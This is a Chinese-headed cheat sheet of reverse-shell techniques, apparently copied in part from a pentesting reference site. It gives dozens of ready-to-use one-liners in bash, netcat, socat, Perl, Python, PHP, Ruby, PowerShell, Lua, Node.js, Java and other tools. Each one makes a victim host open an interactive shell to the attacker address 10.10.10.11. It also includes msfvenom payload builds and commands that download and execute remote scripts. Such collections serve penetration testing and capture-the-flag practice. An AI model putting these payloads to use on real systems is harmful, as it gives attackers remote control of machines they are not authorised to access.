# 反弹shell方法汇总

假设本机地址10.10.10.11，监听端口443。

## 1、Bash环境下反弹TCP协议shell

首先在本地监听TCP协议443端口

```bash
nc -lvp 443
```
然后在靶机上执行如下命令：
```bash
bash -i >& /dev/tcp/10.10.10.11/443 0>&1
```
```bash
/bin/bash -i > /dev/tcp/10.10.10.11/443 0<& 2>&1
```
```bash
exec 5<>/dev/tcp/10.10.10.11/443;cat <&5 | while read line; do $line 2>&5 >&5; done
```
```bash
exec /bin/sh 0</dev/tcp/10.10.10.11/443 1>&0 2>&0
```
```bash
0<&196;exec 196<>/dev/tcp/10.10.10.11/443; sh <&196 >&196 2>&196
```

## 2、Bash环境下反弹UDP协议shell:

首先在本地监听UDP协议443端口
```bash
nc -u -lvp 443
```
然后在靶机上执行如下命令：
```bash
sh -i >& /dev/udp/10.10.10.11/443 0>&1
```

## 3、使用Netcat反弹shell
首先在本地监听TCP协议443端口

```bash
nc -lvp 443
```
然后在靶机上执行如下命令：
```bash
nc -e /bin/sh 10.10.10.11 443
```
```bash
nc -e /bin/bash 10.10.10.11 443
```
```bash
nc -c bash 10.10.10.11 443
```
```bash
mknod backpipe p && nc 10.10.10.11 443 0<backpipe | /bin/bash 1>backpipe 
```
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.11 443 >/tmp/f
```
```bash
rm -f /tmp/p; mknod /tmp/p p && nc 10.10.10.11 443 0/tmp/p 2>&1
```
```bash
rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 10.10.10.11 443 > f
```
```bash
rm -f x; mknod x p && nc 10.10.10.11 443 0<x | /bin/bash 1>x
```

## 4、使用Ncat反弹shell

首先在本地监听TCP协议443端口

```bash
nc -lvp 443
```
然后在靶机上执行如下命令：
```bash
ncat 10.10.10.11 443 -e /bin/bash
```
```bash
ncat --udp 10.10.10.11 443 -e /bin/bash
```

## 5、Telnet:
首先在本地监听TCP协议443端口

```bash
nc -lvp 443
```
然后在靶机上执行如下命令：
```bash
rm -f /tmp/p; mknod /tmp/p p && telnet 10.10.10.11 443 0/tmp/p 2>&1
```
```bash
telnet 10.10.10.11 443 | /bin/bash | telnet 10.10.10.11 444
```
```bash
rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet 10.10.10.11 443 > f
```
```bash
rm -f x; mknod x p && telnet 10.10.10.11 443 0<x | /bin/bash 1>x
```

## 6、Socat:
首先在本地监听TCP协议443端口

```bash
socat file:`tty`,raw,echo=0 TCP-L:443
```
然后在靶机上执行如下命令：
Victim:
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.11:443
Copy
socat tcp-connect:10.10.10.11:443 exec:"bash -li",pty,stderr,setsid,sigint,sane
Copy
Listener:
socat file:`tty`,raw,echo=0 TCP-L:443
Copy
Victim:
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.11:443
Copy
## 7、Perl:
首先在本地监听TCP协议443端口

```bash
nc -lvp 443
```
然后在靶机上执行如下命令：
Victim:
perl -e 'use Socket;$i="10.10.10.11";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
Copy
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.10.11:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
Copy
Windows only, Victim:
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.10.10.11:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
Copy
Python:
IP v4
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.11",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
Copy
export RHOST="10.10.10.11";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
Copy
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.11",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
Copy IP v6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",443,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
Copy Windows only:
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.10.10.11', 443)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
Copy
PHP:
php -r '$sock=fsockopen("10.10.10.11",443);exec("/bin/sh -i <&3 >&3 2>&3");'
Copy
php -r '$s=fsockopen("10.10.10.11",443);$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'
Copy
php -r '$s=fsockopen("10.10.10.11",443);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
Copy
php -r '$s=fsockopen("10.10.10.11",443);`/bin/sh -i <&3 >&3 2>&3`;'
Copy
php -r '$s=fsockopen("10.10.10.11",443);system("/bin/sh -i <&3 >&3 2>&3");'
Copy
php -r '$s=fsockopen("10.10.10.11",443);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
Copy
php -r '$s=\'127.0.0.1\';$p=443;@error_reporting(0);@ini_set("error_log",NULL);@ini_set("log_errors",0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){if($x=proc_open(\'/bin/sh$IFS-i\',array(array(\'pipe\',\'r\'),array(\'pipe\',\'w\'),array(\'pipe\',\'w\')),$p,getcwd())){stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true){if(feof($s))die(\'connection/closed\');if(feof($p[1]))die(\'shell/not/response\');$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));}fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);}else{die("proc_open/disabled");}}else{die("not/connect");}'
Copy
Ruby:
ruby -rsocket -e'f=TCPSocket.open("10.10.10.11",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
Copy
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.11","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
Copy
NOTE: Windows only
ruby -rsocket -e 'c=TCPSocket.new("10.10.10.11","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
Copy
OpenSSL:
Attacker:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
Copy
openssl s_server -quiet -key key.pem -cert cert.pem -port 443
Copy or
ncat --ssl -vv -l -p 443
Copy Victim:
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.11:443 > /tmp/s; rm /tmp/s
Copy
Powershell:
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.11",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
Copy
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.11',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
Copy
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
Copy
Awk:
awk 'BEGIN {s = "/inet/tcp/0/10.10.10.11/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
Copy
TCLsh
echo 'set s [socket 10.10.10.11 443];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
Copy
Java:
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.11/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
Copy
String host="127.0.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
Copy
Thread thread = new Thread(){
    public void run(){
        // Reverse shell here
    }
}
thread.start();
Copy
War:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file
Copy
Lua:
Linux only
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.10.11','443');os.execute('/bin/sh -i <&3 >&3 2>&3');"
Copy
Windows and Linux
lua5.1 -e 'local host, port = "10.10.10.11", 443 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
Copy
NodeJS:
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.10.11", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
Copy
require('child_process').exec('nc -e /bin/sh 10.10.10.11 443')
Copy
-var x = global.process.mainModule.require
-x('child_process').exec('nc 10.10.10.11 443 -e /bin/bash')
Copy
https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
Copy
Groovy:
String host="10.10.10.11";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
Copy
Meterpreter Shell:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe > reverse.exe
Copy
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe > reverse.exe
Copy
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf >reverse.elf
Copy
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf >reverse.elf
Copy
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.11" LPORT=443 -f elf > shell.elf
Copy
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.11" LPORT=443 -f exe > shell.exe
Copy
msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.11" LPORT=443 -f macho > shell.macho
Copy
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.11" LPORT=443 -f asp > shell.asp
Copy
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.11" LPORT=443 -f raw > shell.jsp
Copy
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.11" LPORT=443 -f war > shell.war
Copy
msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.11" LPORT=443 -f raw > shell.py
Copy
msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.11" LPORT=443 -f raw > shell.sh
Copy
msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.11" LPORT=443 -f raw > shell.pl
Copy
Xterm:
xterm -display 10.10.10.11:1
Xnest :1
xhost +targetip
Copy
